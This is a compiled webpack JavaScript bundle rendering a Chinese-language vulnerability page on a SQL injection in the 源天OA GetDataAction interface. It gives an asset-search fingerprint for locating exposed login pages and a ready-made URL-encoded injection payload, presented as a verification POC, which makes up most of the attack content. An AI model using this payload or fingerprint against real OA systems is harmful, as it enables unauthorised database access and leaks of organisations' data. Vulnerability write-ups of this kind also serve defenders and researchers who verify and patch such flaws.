(window.webpackJsonp=window.webpackJsonp||[]).push([[439],{1767:function(t,s,a){t.exports=a.p+"assets/img/1663996343936-60b88623-1eb8-4674-8c7d-a02711370fe7.6a79d548.png"},1768:function(t,s,a){t.exports=a.p+"assets/img/1663996456021-f64802b1-a401-4357-a37e-7bb2a8e1d52e.f9a03f3f.png"},3216:function(t,s,a){"use strict";a.r(s);var r=a(65),e=Object(r.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"源天oa-getdataaction-sql注入漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#源天oa-getdataaction-sql注入漏洞"}},[t._v("#")]),t._v(" 源天OA GetDataAction SQL注入漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("源天OA GetDataAction 接口存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库中的数据，造成信息泄漏")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("源天OA")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('body="/vmain/login.jsp"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1767),alt:"img"}})]),t._v(" "),s("p",[t._v("验证POC")]),t._v(" "),s("div",{staticClass:"language-sql line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-sql"}},[s("code",[s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ServiceAction"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ServiceAction"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("com"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("velcro"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("base"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("GetDataAction?"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("action")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("checkname"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("formid"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("OR")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("207063")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("IN")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("SELECT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sys"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("fn_varbintohexstr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("hashbytes"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),t._v("MD5"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("271")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("AND")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),t._v("a"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("27")]),t._v("a\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1768),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);